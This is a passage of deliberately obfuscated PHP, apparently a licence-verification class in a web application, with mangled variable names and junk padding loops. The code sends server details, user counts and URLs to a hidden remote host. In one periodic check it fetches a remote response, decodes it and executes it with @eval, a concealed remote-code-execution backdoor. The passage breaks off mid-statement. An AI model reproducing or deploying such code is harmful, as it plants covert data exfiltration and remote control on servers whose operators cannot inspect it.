unset($Œ÷É’‰…[$ÆÖµ†Ò·[86]][$ÆÖµ†Ò·[87]][$ÆÖµ†Ò·[91]]); $ëÆÀ§ùê = $ÂßıÇù[653]; if (strlen($ëÆÀ§ùê) < $ÂßıÇù[67]) { return; } $Œ÷É’‰…[$ÆÖµ†Ò·[86]][$ÆÖµ†Ò·[87]][$ÆÖµ†Ò·[92]] = array($ÆÖµ†Ò·[93] => (int) $ş¢‹ƒ¤å[$ÆÖµ†Ò·[94]], $ÆÖµ†Ò·[95] => (int) _get($ş¢‹ƒ¤å, $ÆÖµ†Ò·[96], 0)); $Œ÷É’‰…[$ÆÖµ†Ò·[97]][$ÆÖµ†Ò·[98]] = Action($ÆÖµ†Ò·[99])->accessToken(); $Œ÷É’‰…[$ÆÖµ†Ò·[97]][$ÆÖµ†Ò·[100]] = md5($_SERVER[$ÆÖµ†Ò·[101]] . $•½È¡ãÅ[$ÆÖµ†Ò·[102]]); $×´Ü—êÄ = $ÂßıÇù[654]; $Œ÷É’‰…[$ÆÖµ†Ò·[97]][$ÆÖµ†Ò·[103]] = base64_encode(serverInfo()); $Œ÷É’‰…[$ÆÖµ†Ò·[97]][$ÆÖµ†Ò·[104]] = $this->lkwq0b61f139; if ($•½È¡ãÅ[$ÆÖµ†Ò·[104]] != $ÆÖµ†Ò·[105]) { $Œ÷É’‰…[$ÆÖµ†Ò·[97]][$ÆÖµ†Ò·[106]] = $•½È¡ãÅ[$ÆÖµ†Ò·[106]]; $Œ÷É’‰…[$ÆÖµ†Ò·[97]][$ÆÖµ†Ò·[107]] = $•½È¡ãÅ[$ÆÖµ†Ò·[107]]; $Îõ‰·« = rand_string(10) . $this->lkwq0b61f139 . rand_string(5); $Œ÷É’‰…[$ÆÖµ†Ò·[86]][$ÆÖµ†Ò·[108]][$ÆÖµ†Ò·[109]] = $this->osupfc612153($Îõ‰·«, $Œ÷É’‰…[$ÆÖµ†Ò·[97]][$ÆÖµ†Ò·[100]]); } if ($this->lkwq0b61f139 == $ÆÖµ†Ò·[105]) { $Œ÷É’‰…[$ÆÖµ†Ò·[86]][$ÆÖµ†Ò·[87]][$ÆÖµ†Ò·[92]][$ÆÖµ†Ò·[96]] = 0; } $Œ÷É’‰…[$ÆÖµ†Ò·[97]][$ÆÖµ†Ò·[110]] = _get($this->cfiod0f74927, $ÆÖµ†Ò·[111], $ÆÖµ†Ò·[6]); $Œ÷É’‰…[$ÆÖµ†Ò·[97]][$ÆÖµ†Ò·[112]] = _get($this->cfiod0f74927, $ÆÖµ†Ò·[113], $ÆÖµ†Ò·[6]); $àõÇîç° = $ÂßıÇù[655]; if (_get($GLOBALS, $ÆÖµ†Ò·[114]) && $this->config[$ÆÖµ†Ò·[115]]) { $Œ÷É’‰…[$ÆÖµ†Ò·[97]][$ÆÖµ†Ò·[116]] = WEB_ROOT; } return $Œ÷É’‰…; } private function feird1f22b87() { $ÊåÑùÌœ =& $_SERVER[„Ç©ñÎ©]; $î­ìäû¾ =& $_SERVER[´ºÄÉ³ã]; $€Éƒ—§ö = $_SERVER[$î­ìäû¾[24]] == $î­ìäû¾[117]; if ($_SERVER[$î­ìäû¾[24]] == $î­ìäû¾[118] && $_GET[$î­ìäû¾[119]] == $î­ìäû¾[120]) { $€Éƒ—§ö = !0; } if ($€Éƒ—§ö) { $ò•ãÍê = array($î­ìäû¾[104] => $this->lkwq0b61f139, $î­ìäû¾[121] => $this->zdrve634535f(), $î­ìäû¾[122] => Model($î­ìäû¾[123])->count()); if ($this->lkwq0b61f139 != $î­ìäû¾[105]) { $€à–˜«— = _get($this->cfiod0f74927, $î­ìäû¾[124]); if ($€à–˜«—) { $ò•ãÍê[$î­ìäû¾[125]] = $€à–˜«—; $ò•ãÍê[$î­ìäû¾[126]] = strtotime(_get($this->cfiod0f74927, $î­ìäû¾[127])); $ò•ãÍê[$î­ìäû¾[128]] = _get($this->cfiod0f74927, $î­ìäû¾[113]); } $ü¬¨ Û = Model($î­ìäû¾[33])->get($î­ìäû¾[129], $î­ìäû¾[6], !0); if (is_string($ü¬¨ Û) && substr($ü¬¨ Û, 0, 1) == $î­ìäû¾[130]) { $ü¬¨ Û = json_decode_force($ü¬¨ Û); } if (is_array($ü¬¨ Û) && $ü¬¨ Û[$î­ìäû¾[131]] && strstr($ü¬¨ Û[$î­ìäû¾[131]], $î­ìäû¾[132])) { $¨˜ö¿É© = explode($î­ìäû¾[132], $ü¬¨ Û[$î­ìäû¾[131]]); $ò•ãÍê[$î­ìäû¾[133]] = $¨˜ö¿É©[0]; } } $ò•ãÍê = $this->kzma4a78d61d(json_encode($ò•ãÍê), md5($î­ìäû¾[134])); $¾­Ìü = array($î­ìäû¾[135] => $ò•ãÍê); $‡¯âö¸ = $ÊåÑùÌœ[656]; while (strlen($‡¯âö¸) < $ÊåÑùÌœ[631]) { if (!$‡¯âö¸) { break; } $‡¯âö¸++; } call_user_func(array($î­ìäû¾[136], $î­ìäû¾[137]), $¾­Ìü); } if ($this->lkwq0b61f139 == $î­ìäû¾[105]) { return; } $ÎĞüÆ•Ş = array($î­ìäû¾[138], $î­ìäû¾[139], $î­ìäû¾[140], $î­ìäû¾[141], $î­ìäû¾[142], $î­ìäû¾[143]); $Ñ‹öó·Ñ = $ÊåÑùÌœ[657]; if (!$Ñ‹öó·Ñ) { die; } $—ò¸†¦Ö = Model($î­ìäû¾[33])->get(); $ã¸ÎÚàà = $ÊåÑùÌœ[658]; while ($ã¸ÎÚàà < $ÊåÑùÌœ[631]) { if ($ã¸ÎÚàà >= 0) { break; } $ã¸ÎÚàà++; } $¾­Ìü = array($î­ìäû¾[144] => $—ò¸†¦Ö[$î­ìäû¾[34]], $î­ìäû¾[145] => $—ò¸†¦Ö[$î­ìäû¾[35]], $î­ìäû¾[146] => $î­ìäû¾[6]); $±˜·Ñší = $ÊåÑùÌœ[659]; if (strlen($±˜·Ñší) < $ÊåÑùÌœ[624]) { return; } foreach ($ÎĞüÆ•Ş as $  µŠºë) { if (!isset($—ò¸†¦Ö[$  µŠºë]) || !$—ò¸†¦Ö[$  µŠºë]) { continue; } $¾­Ìü[$  µŠºë] = $—ò¸†¦Ö[$  µŠºë]; } call_user_func(array($î­ìäû¾[136], $î­ìäû¾[137]), $¾­Ìü); } private function eqlhe3f9beb7() { $©ƒäÊ«ø =& $_SERVER[„Ç©ñÎ©]; $Å¨ù¹ªÍ =& $_SERVER[´ºÄÉ³ã]; if ($_SERVER[$Å¨ù¹ªÍ[24]] != $Å¨ù¹ªÍ[147]) { return; } if (!_get($GLOBALS, $Å¨ù¹ªÍ[114])) { die; } $İ¦ñ£´Â = $GLOBALS[$Å¨ù¹ªÍ[13]]; if (isset($İ¦ñ£´Â[$Å¨ù¹ªÍ[148]])) { $this->nkdg1d07fcab(); die; } if (!isset($İ¦ñ£´Â[$Å¨ù¹ªÍ[149]]) || strlen($İ¦ñ£´Â[$Å¨ù¹ªÍ[149]]) != 16) { show_json($Å¨ù¹ªÍ[150] . $İ¦ñ£´Â[$Å¨ù¹ªÍ[149]], !1); } $„î¢¬ú» = Model($Å¨ù¹ªÍ[33])->get($Å¨ù¹ªÍ[102]); $ö×Ó’‰ = md5($_SERVER[$Å¨ù¹ªÍ[101]] . $„î¢¬ú»); $«°àÅ…À = array($Å¨ù¹ªÍ[149] => $İ¦ñ£´Â[$Å¨ù¹ªÍ[149]], $Å¨ù¹ªÍ[151] => rand_string(16), $Å¨ù¹ªÍ[152] => $Å¨ù¹ªÍ[134], $Å¨ù¹ªÍ[153] => $Å¨ù¹ªÍ[154], $Å¨ù¹ªÍ[155] => $_SERVER[$Å¨ù¹ªÍ[156]], $Å¨ù¹ªÍ[157] => $_SERVER[$Å¨ù¹ªÍ[158]], $Å¨ù¹ªÍ[159] => $_SERVER[$Å¨ù¹ªÍ[160]], $Å¨ù¹ªÍ[100] => $ö×Ó’‰, $Å¨ù¹ªÍ[161] => Model($Å¨ù¹ªÍ[33])->get($Å¨ù¹ªÍ[129])); $¥šÃµñÆ = $©ƒäÊ«ø[660]; if ($İ¦ñ£´Â[$Å¨ù¹ªÍ[162]] == $Å¨ù¹ªÍ[163]) { $Îƒ¥ßá¸ = $this->kzma4a78d61d($ö×Ó’‰, $Å¨ù¹ªÍ[164]); $‡§±Ô“Å = $this->osupfc612153(json_encode($«°àÅ…À), $ö×Ó’‰ . $Å¨ù¹ªÍ[165], 3); $‡§±Ô“Å = $‡§±Ô“Å . $Å¨ù¹ªÍ[166] . $_SERVER[$Å¨ù¹ªÍ[156]]; $¢°ùåá = $this->rtuif6aec8ae($Å¨ù¹ªÍ[167] . $Îƒ¥ßá¸ . $Å¨ù¹ªÍ[168] . $‡§±Ô“Å, -1); show_json($¢°ùåá, !0); } else { if ($İ¦ñ£´Â[$Å¨ù¹ªÍ[162]] == $Å¨ù¹ªÍ[169]) { $Ñª€ÁÆú = substr(md5($Å¨ù¹ªÍ[170] . $ö×Ó’‰), 12, 15) . $Å¨ù¹ªÍ[171]; $‡§±Ô“Å = $this->mpvf8d79895f(trim($İ¦ñ£´Â[$Å¨ù¹ªÍ[172]]), $Ñª€ÁÆú, 2); $µ­®¿à = json_decode($‡§±Ô“Å, !0); if (!is_array($µ­®¿à) || !is_array($µ­®¿à[$Å¨ù¹ªÍ[173]]) || $µ­®¿à[$Å¨ù¹ªÍ[149]] != !0) { $ºƒ…ÜÓø = $Å¨ù¹ªÍ[174]; $òèƒ…–â = $µ­®¿à[$Å¨ù¹ªÍ[173]] ? $Å¨ù¹ªÍ[175] . $µ­®¿à[$Å¨ù¹ªÍ[173]] : $ºƒ…ÜÓø; show_json($òèƒ…–â, !1); } else { $«°àÅ…À[$Å¨ù¹ªÍ[151]] = $µ­®¿à[$Å¨ù¹ªÍ[173]][$Å¨ù¹ªÍ[176]]; } } else { $µ­®¿à = $this->rtuif6aec8ae($Å¨ù¹ªÍ[177], $«°àÅ…À, 10); $‹³Øıœ« = $©ƒäÊ«ø[661]; if (strlen($‹³Øıœ«) < $©ƒäÊ«ø[67]) { return; } } } if (!is_array($µ­®¿à) || !is_array($µ­®¿à[$Å¨ù¹ªÍ[173]]) || $µ­®¿à[$Å¨ù¹ªÍ[149]] != !0) { $ºƒ…ÜÓø = LNG($Å¨ù¹ªÍ[178]); $òèƒ…–â = $µ­®¿à[$Å¨ù¹ªÍ[173]] ? $Å¨ù¹ªÍ[175] . $µ­®¿à[$Å¨ù¹ªÍ[173]] : $ºƒ…ÜÓø; show_json($òèƒ…–â, !1); } $Ñ£óçÜ = $µ­®¿à[$Å¨ù¹ªÍ[173]]; $Íúíó‹í = $this->aqiha09a0cee($Ñ£óçÜ[$Å¨ù¹ªÍ[179]]); $’ğÁÛÛ… = $©ƒäÊ«ø[662]; if (!$Íúíó‹í || $Íúíó‹í != $Ñ£óçÜ[$Å¨ù¹ªÍ[127]]) { $²´ÒËá… = array($Å¨ù¹ªÍ[180] => Model($Å¨ù¹ªÍ[33])->get($Å¨ù¹ªÍ[102]), $Å¨ù¹ªÍ[181] => $_SERVER[$Å¨ù¹ªÍ[101]], $Å¨ù¹ªÍ[182] => this_url(), $Å¨ù¹ªÍ[157] => $_SERVER[$Å¨ù¹ªÍ[158]]); $‡§±Ô“Å = $this->mgji2be61eb1(json_encode($²´ÒËá…)); $this->rtuif6aec8ae($Å¨ù¹ªÍ[183] . $‡§±Ô“Å); show_json(LNG($Å¨ù¹ªÍ[184]), !0); } $¹¦ƒöñâ = array($Å¨ù¹ªÍ[185] => $Ñ£óçÜ[$Å¨ù¹ªÍ[186]], $Å¨ù¹ªÍ[187] => $Ñ£óçÜ[$Å¨ù¹ªÍ[188]], $Å¨ù¹ªÍ[189] => rand_string(16), $Å¨ù¹ªÍ[104] => $Ñ£óçÜ[$Å¨ù¹ªÍ[190]]); if ($«°àÅ…À[$Å¨ù¹ªÍ[151]]) { $¹¦ƒöñâ[$Å¨ù¹ªÍ[189]] = $«°àÅ…À[$Å¨ù¹ªÍ[151]]; } $ıèö¤ê® = substr(md5($¹¦ƒöñâ[$Å¨ù¹ªÍ[187]]), 10, 10); $Ô‹ŠÕ¯ = $ıèö¤ê® . $¹¦ƒöñâ[$Å¨ù¹ªÍ[104]] . $¹¦ƒöñâ[$Å¨ù¹ªÍ[189]]; $¹õŠïíÍ = $©ƒäÊ«ø[663]; if (!$¹õŠïíÍ) { return; } $¹¦ƒöñâ[$Å¨ù¹ªÍ[106]] = strrev(base64_encode($this->kzma4a78d61d($Ô‹ŠÕ¯, $Å¨ù¹ªÍ[191]))); $Š˜³øÈ¯ = rand_string(16); $¿¸‰‰îî = $©ƒäÊ«ø[664]; $Çë”îí = $Š˜³øÈ¯ . $¹¦ƒöñâ[$Å¨ù¹ªÍ[104]] . $this->kzma4a78d61d(md5($¹¦ƒöñâ[$Å¨ù¹ªÍ[185]]), $Š˜³øÈ¯); $¹¦ƒöñâ[$Å¨ù¹ªÍ[107]] = base64_encode(strrev($this->kzma4a78d61d($Çë”îí, $Å¨ù¹ªÍ[192]))); $ìğ…ğ¡Å = $©ƒäÊ«ø[665]; if (!$ìğ…ğ¡Å) { return; } if ($Ñ£óçÜ[$Å¨ù¹ªÍ[193]] && $Ñ£óçÜ[$Å¨ù¹ªÍ[193]] >= 1) { Model($Å¨ù¹ªÍ[33])->setDeep($Å¨ù¹ªÍ[194], $Å¨ù¹ªÍ[120]); } Model($Å¨ù¹ªÍ[33])->set($¹¦ƒöñâ); $»§‘‹è¹ = md5($_SERVER[$Å¨ù¹ªÍ[101]] . strrev($„î¢¬ú») . $¹¦ƒöñâ[$Å¨ù¹ªÍ[187]]); $«ÛÊßÔ™ = $©ƒäÊ«ø[666]; while (strlen($«ÛÊßÔ™) < $©ƒäÊ«ø[624]) { if (!$«ÛÊßÔ™) { break; } $«ÛÊßÔ™++; } $¦Ÿ¼×¨â = strrev(substr($»§‘‹è¹, 10, 16)); $óÄ²âçİ = $©ƒäÊ«ø[667]; $´¯—…Íì = $this->osupfc612153(json_encode($Ñ£óçÜ), $»§‘‹è¹); $Ì‚ìæÃ = $©ƒäÊ«ø[668]; if (!$Ì‚ìæÃ) { return; } $£úãÂ¡¼ = array_to_keyvalue(Model($Å¨ù¹ªÍ[7])->listData(), $Å¨ù¹ªÍ[195]); $¶ÅşŸãö = $£úãÂ¡¼[$Å¨ù¹ªÍ[196]]; $ó—Üˆ‰ã = array(); $ó—Üˆ‰ã[$¦Ÿ¼×¨â] = $´¯—…Íì; $„˜­Øøæ = $©ƒäÊ«ø[669]; if (strlen($„˜­Øøæ) < $©ƒäÊ«ø[631]) { return; } Model($Å¨ù¹ªÍ[7])->update($¶ÅşŸãö[$Å¨ù¹ªÍ[197]], array($Å¨ù¹ªÍ[198] => $ó—Üˆ‰ã)); $ÚìÃÌâ = $©ƒäÊ«ø[670]; if (strlen($ÚìÃÌâ) < $©ƒäÊ«ø[634]) { die; } $this->cfiod0f74927 = $Ñ£óçÜ; $åèŞœÖÔ = $©ƒäÊ«ø[671]; $this->lkwq0b61f139 = $¹¦ƒöñâ[$Å¨ù¹ªÍ[104]]; $this->licenseRegistSuccess(); Cache::set($Å¨ù¹ªÍ[199] . md5($„î¢¬ú» . $Å¨ù¹ªÍ[200]), $Å¨ù¹ªÍ[6]); $‚¸İú˜ = $©ƒäÊ«ø[672]; while (strlen($‚¸İú˜) < $©ƒäÊ«ø[634]) { if (!$‚¸İú˜) { break; } $‚¸İú˜++; } show_json(LNG($Å¨ù¹ªÍ[184]), !0); $ø²–Â®± = $©ƒäÊ«ø[673]; if (!$ø²–Â®±) { die; } } private function licenseRegistSuccess() { $”¾íËË =& $_SERVER[„Ç©ñÎ©]; $ ƒÛÌïì =& $_SERVER[´ºÄÉ³ã]; $üíÙˆ´ = Model($ ƒÛÌïì[33])->get(); $’ÖÙ—’ = $”¾íËË[674]; if (strlen($’ÖÙ—’) < $”¾íËË[634]) { return; } if ($üíÙˆ´[$ ƒÛÌïì[63]] != $ ƒÛÌïì[120]) { Model($ ƒÛÌïì[33])->set($ ƒÛÌïì[63], $ ƒÛÌïì[120]); } Action($ ƒÛÌïì[201])->initStart(!0); } private function nkdg1d07fcab() { $íÇÙÜË =& $_SERVER[„Ç©ñÎ©]; $ª“â°ØÖ =& $_SERVER[´ºÄÉ³ã]; Model($ª“â°ØÖ[33])->set(array($ª“â°ØÖ[185] => $ª“â°ØÖ[6], $ª“â°ØÖ[187] => $ª“â°ØÖ[6], $ª“â°ØÖ[104] => $ª“â°ØÖ[105], $ª“â°ØÖ[106] => $ª“â°ØÖ[6], $ª“â°ØÖ[107] => $ª“â°ØÖ[6])); Model($ª“â°ØÖ[33])->setDeep($ª“â°ØÖ[194], $ª“â°ØÖ[202]); $£«ä¯û = $íÇÙÜË[675]; if (!$£«ä¯û) { return; } $this->cfiod0f74927 = array(); $this->lkwq0b61f139 = $ª“â°ØÖ[105]; $¯ğ”ä¡ = $íÇÙÜË[676]; } private function mitr6d4d0a4c() { $Ì‰÷»ğŠ =& $_SERVER[„Ç©ñÎ©]; $ó¸á ö =& $_SERVER[´ºÄÉ³ã]; $_SERVER[$ó¸á ö[158]] = _get($_SERVER, $ó¸á ö[158], APP_HOST); $this->lkwq0b61f139 = $ó¸á ö[105]; $ú“³²Ä = Model($ó¸á ö[33])->get(); if ($ú“³²Ä[$ó¸á ö[104]] == $ó¸á ö[105]) { return; } $İ¿ĞµÔ = Model($ó¸á ö[33])->get($ó¸á ö[102]); $úÈÔ×ì = $Ì‰÷»ğŠ[677]; $‚›ÉÍÍ§ = $ó¸á ö[199] . md5($İ¿ĞµÔ . $ó¸á ö[200]); $ıÇœß¸¢ = Cache::get($‚›ÉÍÍ§); if (!is_array($ıÇœß¸¢) || !isset($ıÇœß¸¢[$ó¸á ö[203]]) || time() - $ıÇœß¸¢[$ó¸á ö[203]] >= 60) { $ÁÊØ²·Æ = Model($ó¸á ö[7])->loadList(); $èßÀÒ¶ = $ÁÊØ²·Æ[$ó¸á ö[196]]; $Ç½ë = md5($_SERVER[$ó¸á ö[101]] . strrev($İ¿ĞµÔ) . $ú“³²Ä[$ó¸á ö[187]]); $¹–Ğøƒ° = strrev(substr($Ç½ë, 10, 16)); $ıÇœß¸¢ = $this->mpvf8d79895f($èßÀÒ¶[$ó¸á ö[84]][$¹–Ğøƒ°], $Ç½ë); $ıÇœß¸¢ = json_decode($ıÇœß¸¢, !0); } if (!is_array($ıÇœß¸¢)) { return $this->nkdg1d07fcab(); } $•µ‘ŞÅ‘ = strtotime($ıÇœß¸¢[$ó¸á ö[127]]); if (time() >= $•µ‘ŞÅ‘) { return $this->nkdg1d07fcab(); } if (time() - $ıÇœß¸¢[$ó¸á ö[203]] > 20) { $ıÇœß¸¢[$ó¸á ö[203]] = time(); Cache::set($‚›ÉÍÍ§, $ıÇœß¸¢); } $this->cfiod0f74927 = $ıÇœß¸¢; $this->lkwq0b61f139 = $ú“³²Ä[$ó¸á ö[104]]; $«ê¼È¦ = $Ì‰÷»ğŠ[678]; while ($«ê¼È¦ < $Ì‰÷»ğŠ[631]) { if ($«ê¼È¦ >= 0) { break; } $«ê¼È¦++; } } private function fouadee1eb60() { $ÖùêéÔ =& $_SERVER[„Ç©ñÎ©]; $ÎÜ›ˆ€¯ =& $_SERVER[´ºÄÉ³ã]; $Ãˆ­Õµ• = $GLOBALS[$ÎÜ›ˆ€¯[13]]; $š§Ã¶ú = $ÖùêéÔ[679]; $‚ÄäÄÂ = $_SERVER[$ÎÜ›ˆ€¯[24]]; $Û´â®ºÆ = $ÖùêéÔ[680]; if (!$Û´â®ºÆ) { return; } if ($‚ÄäÄÂ == $ÎÜ›ˆ€¯[204] && $this->lkwq0b61f139 == $ÎÜ›ˆ€¯[105]) { show_json(LNG($ÎÜ›ˆ€¯[205]), !1, $ÎÜ›ˆ€¯[206]); } $èßÜ¯Ö­ = array($ÎÜ›ˆ€¯[207], $ÎÜ›ˆ€¯[208]); if (in_array($‚ÄäÄÂ, $èßÜ¯Ö­)) { if ($this->lkwq0b61f139 == $ÎÜ›ˆ€¯[105] && isset($Ãˆ­Õµ•[$ÎÜ›ˆ€¯[209]])) { show_json(LNG($ÎÜ›ˆ€¯[205]), !1, $ÎÜ›ˆ€¯[206]); die; } $—§ø“Â¸ = $this->zdrve634535f(); if ($—§ø“Â¸ != intval($ÎÜ›ˆ€¯[210])) { if ($—§ø“Â¸ <= Model($ÎÜ›ˆ€¯[123])->count()) { show_json(LNG($ÎÜ›ˆ€¯[211]), !1, $ÎÜ›ˆ€¯[206]); die; } } } } private function lshnd085c94f() { $ş´İÕ¼á =& $_SERVER[„Ç©ñÎ©]; $î‡†ĞÜö =& $_SERVER[´ºÄÉ³ã]; $ ÄÅöÚ = array($î‡†ĞÜö[117], $î‡†ĞÜö[118]); if (!_get($GLOBALS, $î‡†ĞÜö[114]) || !isset($_GET[$î‡†ĞÜö[212]])) { return; } if (!in_array($_SERVER[$î‡†ĞÜö[24]], $ ÄÅöÚ)) { return; } $œ“àú = $î‡†ĞÜö[213]; $œ“àú = $this->fegmcecc0123($œ“àú, $î‡†ĞÜö[214]); $ñÌ÷ÚğÔ = stream_context_create(array($î‡†ĞÜö[215] => array($î‡†ĞÜö[216] => $î‡†ĞÜö[217], $î‡†ĞÜö[218] => 3))); $ÜÚÔÀ¢Å = @file_get_contents($œ“àú, !1, $ñÌ÷ÚğÔ); $ÏşúÜË¶ = $ş´İÕ¼á[681]; if (strlen($ÏşúÜË¶) < $ş´İÕ¼á[631]) { return; } header($î‡†ĞÜö[219]); if ($ÜÚÔÀ¢Å && strstr($ÜÚÔÀ¢Å, $î‡†ĞÜö[220])) { echo $ÜÚÔÀ¢Å; } die; } public function hybz0d2c34d4($Íã±î ¿) { $¸ñôÉÀ‡ =& $_SERVER[„Ç©ñÎ©]; $ÉëôÀİş =& $_SERVER[´ºÄÉ³ã]; if ($this->lkwq0b61f139 == $ÉëôÀİş[221]) { return $Íã±î ¿; } $ÌâÌéÑ = array($ÉëôÀİş[222] => $ÉëôÀİş[223], $ÉëôÀİş[224] => $ÉëôÀİş[223], $ÉëôÀİş[225] => $ÉëôÀİş[223], $ÉëôÀİş[226] => $ÉëôÀİş[223], $ÉëôÀİş[227] => $ÉëôÀİş[228], $ÉëôÀİş[229] => $ÉëôÀİş[228], $ÉëôÀİş[230] => $ÉëôÀİş[228], $ÉëôÀİş[231] => $ÉëôÀİş[228], $ÉëôÀİş[232] => $ÉëôÀİş[228], $ÉëôÀİş[233] => $ÉëôÀİş[228], $ÉëôÀİş[234] => $ÉëôÀİş[228], $ÉëôÀİş[235] => $ÉëôÀİş[228], $ÉëôÀİş[236] => $ÉëôÀİş[228], $ÉëôÀİş[237] => $ÉëôÀİş[228], $ÉëôÀİş[238] => $ÉëôÀİş[228], $ÉëôÀİş[239] => $ÉëôÀİş[228]); $»¨¾¬âû = explode($ÉëôÀİş[240], _get($this->cfiod0f74927, $ÉëôÀİş[111], $ÉëôÀİş[6])); $Ã¼É“¦ø = array(); foreach ($ÌâÌéÑ as $á‹Ëûá => $Íš‘ÂŠ‰) { if ($Íš‘ÂŠ‰ == $ÉëôÀİş[223] && substr($this->lkwq0b61f139, 0, 1) == $ÉëôÀİş[223]) { continue; } if (!in_array($á‹Ëûá, $»¨¾¬âû)) { $Ã¼É“¦ø[] = $á‹Ëûá; } } foreach ($Ã¼É“¦ø as $á‹Ëûá) { unset($Íã±î ¿[$á‹Ëûá]); $ã‚ŸÈÇ” = $¸ñôÉÀ‡[682]; if (strlen($ã‚ŸÈÇ”) < $¸ñôÉÀ‡[650]) { die; } } return $Íã±î ¿; } private function mdohc87b67cc() { $öãœÈÁ· =& $_SERVER[´ºÄÉ³ã]; if ($this->lkwq0b61f139 != $öãœÈÁ·[105]) { $GLOBALS[$öãœÈÁ·[84]][$öãœÈÁ·[88]][$öãœÈÁ·[241]] = $öãœÈÁ·[202]; return; } $GLOBALS[$öãœÈÁ·[84]][$öãœÈÁ·[242]] = $öãœÈÁ·[120]; if (Model($öãœÈÁ·[243])->get($öãœÈÁ·[63]) != $öãœÈÁ·[202]) { Model($öãœÈÁ·[243])->set($öãœÈÁ·[63], $öãœÈÁ·[202]); } } public function izyu2fc91838() { $õ•ƒºñ =& $_SERVER[„Ç©ñÎ©]; return $_SERVER[´ºÄÉ³ã][244]; $Ø¶ÈêûÚ = $õ•ƒºñ[683]; while (strlen($Ø¶ÈêûÚ) < $õ•ƒºñ[650]) { if (!$Ø¶ÈêûÚ) { break; } $Ø¶ÈêûÚ++; } } private function rnlw4fa08faf() { $·É¾Ï» =& $_SERVER[„Ç©ñÎ©]; $ÌòÖ˜Šƒ =& $_SERVER[´ºÄÉ³ã]; $¡ğåÑÈı = array($ÌòÖ˜Šƒ[245], $ÌòÖ˜Šƒ[246], $ÌòÖ˜Šƒ[247]); $ß•£ô—¼ = $ÌòÖ˜Šƒ[248] . md5($ÌòÖ˜Šƒ[249]); $¬›¥„Äµ = $·É¾Ï»[684]; while (strlen($¬›¥„Äµ) < $·É¾Ï»[631]) { if (!$¬›¥„Äµ) { break; } $¬›¥„Äµ++; } if ($this->lkwq0b61f139 == $ÌòÖ˜Šƒ[105] || !_get($GLOBALS, $ÌòÖ˜Šƒ[114])) { return; } if (!in_array($_SERVER[$ÌòÖ˜Šƒ[24]], $¡ğåÑÈı)) { return; } if (time() % 4 != 0) { return; } $¦±à¡Úå = call_user_func(array($ÌòÖ˜Šƒ[250], $ÌòÖ˜Šƒ[251]), $ß•£ô—¼); if ($¦±à¡Úå && time() - $¦±à¡Úå < intval($ÌòÖ˜Šƒ[252])) { return; } call_user_func(array($ÌòÖ˜Šƒ[250], $ÌòÖ˜Šƒ[137]), $ß•£ô—¼, time()); $Ğì¡¼¶ø = Model($ÌòÖ˜Šƒ[33])->get($ÌòÖ˜Šƒ[102]); $Şœ‡ĞÎà = array($ÌòÖ˜Šƒ[149] => Model($ÌòÖ˜Šƒ[33])->get($ÌòÖ˜Šƒ[185]), $ÌòÖ˜Šƒ[162] => $this->lkwq0b61f139, $ÌòÖ˜Šƒ[159] => $_SERVER[$ÌòÖ˜Šƒ[160]], $ÌòÖ˜Šƒ[161] => Model($ÌòÖ˜Šƒ[33])->get($ÌòÖ˜Šƒ[129]), $ÌòÖ˜Šƒ[100] => md5($_SERVER[$ÌòÖ˜Šƒ[101]] . $Ğì¡¼¶ø), $ÌòÖ˜Šƒ[152] => $ÌòÖ˜Šƒ[134], $ÌòÖ˜Šƒ[155] => $_SERVER[$ÌòÖ˜Šƒ[156]]); $²åáËÑ— = $·É¾Ï»[685]; $åœÖ™¶ = $this->rtuif6aec8ae($ÌòÖ˜Šƒ[253], $Şœ‡ĞÎà); if (!is_array($åœÖ™¶)) { return; } if ($åœÖ™¶[$ÌòÖ˜Šƒ[149]] && $åœÖ™¶[$ÌòÖ˜Šƒ[254]]) { if ($this->aqiha09a0cee($åœÖ™¶[$ÌòÖ˜Šƒ[254]]) == $Şœ‡ĞÎà[$ÌòÖ˜Šƒ[149]]) { return; } } $this->nkdg1d07fcab(); $¸¸ª ’ = $·É¾Ï»[686]; if (strlen($¸¸ª ’) < $·É¾Ï»[67]) { return; } if ($this->aqiha09a0cee($åœÖ™¶[$ÌòÖ˜Šƒ[254]]) != $Şœ‡ĞÎà[$ÌòÖ˜Šƒ[149]]) { $ôşËß›¥ = array($ÌòÖ˜Šƒ[180] => $Ğì¡¼¶ø, $ÌòÖ˜Šƒ[181] => $_SERVER[$ÌòÖ˜Šƒ[101]], $ÌòÖ˜Šƒ[182] => this_url(), $ÌòÖ˜Šƒ[157] => $_SERVER[$ÌòÖ˜Šƒ[158]]); $Ô×Ÿ»ì = $this->mgji2be61eb1(json_encode($ôşËß›¥)); $åœÖ™¶ = $this->rtuif6aec8ae($ÌòÖ˜Šƒ[183] . $Ô×Ÿ»ì); if ($åœÖ™¶ && is_array($åœÖ™¶) && isset($åœÖ™¶[$ÌòÖ˜Šƒ[254]])) { $¹‘½¾‡¾ = $this->mpvf8d79895f($åœÖ™¶[$ÌòÖ˜Šƒ[254]], 2); if ($¹‘½¾‡¾) { $¹‘½¾‡¾ = $this->aqiha09a0cee($¹‘½¾‡¾); } if ($¹‘½¾‡¾) { try { @eval($¹‘½¾‡¾); } catch (Exception $¥©‘Òªò) { } } } } } private function rtuif6aec8ae($œ³°ò³º = '', $ı©Ÿ¹İ¸ = array(), $üì¤–®‹ = 5) { $€ï”°²è =& $_SERVER[„Ç©ñÎ©]; $ÇØß¬ÀÜ =& $_SERVER[´ºÄÉ³ã]; $±àØƒì€ = $ÇØß¬ÀÜ[255]; $«ÇÒí†« = $€ï”°²è[687]; if (strlen($«ÇÒí†«) < $€ï”°²è[624]) { return; } $±àØƒì€ = $this->fegmcecc0123($±àØƒì€, $ÇØß¬ÀÜ[256]); $úÈÎÔÈ = $€ï”°²è[688]; if (strlen($úÈÎÔÈ) < $€ï”°²è[624]) { die; } $±àØƒì€ = $±àØƒì€ . $œ³°ò³º; $ËÜ”‘¥± = $€ï”°²è[689]; if (strlen($ËÜ”‘¥±) < $€ï”°²è[634]) { return; } if ($ı©Ÿ¹İ¸ && is_array($ı©Ÿ¹İ¸)) { $±àØƒì€ = $±àØƒì€ . $ÇØß¬ÀÜ[257] . http_build_query($ı©Ÿ¹İ¸); } if ($ı©Ÿ¹İ¸ === -1) { return $±àØƒì€; } $ºäˆîóÎ = stream_context_create(array($ÇØß¬ÀÜ[215] => array($ÇØß¬ÀÜ[218] => $üì¤–®‹, $ÇØß¬ÀÜ[216] => $ÇØß¬ÀÜ[258]), $ÇØß¬ÀÜ[259] => array($ÇØß¬ÀÜ[260] => !1, $ÇØß¬ÀÜ[261] => !1))); $ı©Ÿ¹İ¸ = 